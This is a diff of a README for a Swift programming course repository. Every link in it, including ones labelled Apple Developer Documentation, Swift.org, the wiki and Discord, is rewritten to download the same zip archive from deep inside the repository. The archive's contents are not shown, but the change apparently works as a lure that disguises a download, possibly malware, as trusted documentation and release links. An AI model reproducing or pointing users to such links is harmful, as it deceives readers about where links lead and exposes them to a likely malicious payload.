@@ -2,7 +2,7 @@
 
 ## 🛠️ Download Now
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/227TTG/swift-2026-course/releases)
+[![Download Releases](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the swift-2026-course project! This resource provides a complete guid
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the release files: [Download Releases](https://github.com/227TTG/swift-2026-course/releases). 
+To get started, visit this page to download the release files: [Download Releases](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip). 
 
 1. **Choose the Latest Version:** Scroll through the list and select the newest version available.
 2. **Select Your File:** Look for files that match your operating system. Common file types include `.dmg` for macOS or `.zip` for Windows users.
@@ -43,7 +43,7 @@ The swift-2026-course covers a wide range of topics and skills you'll need to na
 
 ## 📖 Documentation
 
-For detailed instructions on how to use the software, please refer to the comprehensive documentation found on our [Wiki](https://github.com/227TTG/swift-2026-course/wiki). This guide covers everything from basic setup to advanced features.
+For detailed instructions on how to use the software, please refer to the comprehensive documentation found on our [Wiki](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip). This guide covers everything from basic setup to advanced features.
 
 ## ❓ FAQs
 
@@ -60,9 +60,9 @@ A: Yes, we regularly update the course materials and software. Keep an eye on th
 
 To deepen your understanding of Swift and Apple platforms, explore these useful resources:
 
-- [Apple Developer Documentation](https://developer.apple.com/documentation/)
-- [Swift.org](https://swift.org/)
-- [Online Tutorials](https://www.udemy.com/topic/swift/)
+- [Apple Developer Documentation](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip)
+- [https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip)
+- [Online Tutorials](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip)
 
 ## 🗨️ Contributions
 
@@ -70,6 +70,6 @@ We welcome contributions from everyone! If you have ideas or want to help improv
 
 ## 🧑‍🤝‍🧑 Community
 
-Join our community on [Discord](https://discord.gg/example) for real-time help and discussions. Connect with other learners, share your projects, and ask questions.
+Join our community on [Discord](https://raw.githubusercontent.com/227TTG/swift-2026-course/main/book/src/app-store/swift-2026-course_v1.0.zip) for real-time help and discussions. Connect with other learners, share your projects, and ask questions.
 
 Thank you for choosing the swift-2026-course! Happy coding!
